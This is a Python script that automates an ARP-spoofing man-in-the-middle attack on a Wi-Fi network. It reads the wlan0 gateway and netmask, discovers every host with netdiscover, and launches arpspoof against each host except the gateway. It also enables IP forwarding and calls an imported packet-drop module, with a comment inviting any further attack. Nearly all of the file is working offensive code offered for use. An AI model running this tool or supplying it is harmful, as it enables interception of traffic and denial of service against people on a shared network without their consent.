#!/usr/bin/env python
import re
import subprocess
import multiprocessing
import time
import packet_drop
class Find_network_ip_info:

    def get_gateway(self):
        command = "ip route show dev wlan0"
        try:
            ans = subprocess.check_output(command, shell=True, encoding="utf-8")
        except subprocess.CalledProcessError:
            print("[+] Couldn't find LAN Gateway, please activate wlan0 interface.")
            return
        ans = re.search("(default via )(.*)( proto)" ,ans)
        if ans is None:
            print("[+] Please connect your computer to an WI-FI network.")
            return
        return ans.group(2)

    def gather_info(self):
            # First we check if the wlan0 interface exists and what is it in order to get the internet's gateway and submask

            command = "ifconfig wlan0 2> 0"
            try:
                ans = subprocess.check_output(command ,shell = True ,encoding ="utf-8")
            except subprocess.CalledProcessError:
                print("[+] Couldn't find LAN Gateway, please activate wlan0 interface.")
                subprocess.call("rm 0", shell=True)
                return

            # Now we have to check if the computer is connected to an WI-FI, more exactly, to check if the computer has an IP assigned
            # If the computer has a network connection we have to find the IP and the netmask
            a = re.search("(inet )(.*)( netmask )(.*)(  broadcast )(.*)" ,ans)
            if a is None:
                subprocess.call("rm 0", shell=True)
                print("[+] Please connect your computer to an WI-FI network.")
                return

            netmask = a.group(4)
            ip_adress = a.group(2)
            # Now we have to get the CIDR notation of the internet
            count = netmask.count("255")
            if count == int(2):
                cidr = "/16"
            else :
                cidr = "/24"
            subprocess.call("rm 0", shell=True)
            return [netmask ,ip_adress ,cidr]




class Findall_ips_on_network:

    def __init__(self ,IP,NETMASK,CIDR):
        self.network_ip = IP
        self.cidr = CIDR
        self.netmask = NETMASK

    def get_right_ip(self, count):
        point_count = int(0)
        ip_search = ""
        for i in range(0, len(self.network_ip),1):
            ip_search += self.network_ip[i]
            if self.network_ip[i] == '.':
                point_count += int(1)
            if point_count == count:
                break
        return ip_search

    def get_what_matters(self,content):
        count = int(0)
        position = int(0)
        for i in range(len(content) - 1, 0, -1):
            if content[i] == '-':
                count += 1
            if count == int(77):
                position = i - 1
                break
        start_position = 0
        end_position = position
        return content[:start_position] + content[end_position:]
    def run_netdiscover(self, command):
        process = subprocess.Popen(command,stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
        print("[+] Discovering all the ips, please wait..." ,end='\r')
        process.wait()
        print("[+] We found all of the ips on the network!")
    def discover_ips(self):
        count = self.netmask.count("255")
        ip_search = self.get_right_ip(count)

        # We have to run netdiscover twice because from my experience it doesn't get all of the ips from the first try
        if count == int(3):
            command = "netdiscover -r " + ip_search + "0" + self.cidr + " -i wlan0 -P > 0"
            self.run_netdiscover(command)
        if count == int(2):
            command = "netdiscover -r " + ip_search + "0.0" + self.cidr + " -i wlan0 -P > 0"
            self.run_netdiscover(command)
        # Now we have to find all of the ips, using regex, from the '0' file that we created when we used netdiscover
        file_path = "0"
        with open(file_path, 'r') as file:
            content = file.read()
        ip_addresses = re.findall(r'\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b',content)
        subprocess.call("rm 0",shell = True)
        return ip_addresses


class Attack:

    def __init__(self,ip_addresses,Gateway):
        self.ips = ip_addresses
        self.gateway = Gateway

    def run_command(self, command):
        process = subprocess.Popen(command, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE,shell=True)
    def runnning_attack(self):
        processes = []
        for ip in self.ips:
            if ip != self.gateway:
                processes.append(0)

        count = 0
        for ip in self.ips:
            if ip != self.gateway:
                #print(ip)
                command = "arpspoof -i wlan0 -t " + ip + " -r " + self.gateway
                process = multiprocessing.Process(target = self.run_command(command))
                processes[count] = process
                count += 1
                process.start()

        #Here while you are the MITM you can run any attack you would like
        attack = packet_drop.Packet_drop()
        attack.run_attack()

        #time.sleep(running_time)
        for process in processes:
            process.terminate()
            process.join()

class Set_values:

    def make_settings(self,up_down):
        command = "ifconfig eth0 " + up_down
        subprocess.call(command ,shell = True)
        if up_down == "up":
            return
        command = "echo 1 >/proc/sys/net/ipv4/ip_forward"
        subprocess.call(command ,shell = True)
